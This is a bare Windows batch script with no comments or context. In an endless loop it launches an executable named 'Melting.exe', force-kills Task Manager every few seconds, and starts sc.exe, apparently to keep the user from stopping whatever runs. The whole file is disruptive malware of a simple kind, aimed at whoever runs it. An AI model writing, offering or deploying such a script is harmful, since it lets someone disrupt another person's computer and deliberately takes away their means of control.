@echo off
:main
timeout /t 3
start Melting.exe
taskkill /f /im taskmgr.exe
start sc.exe
goto main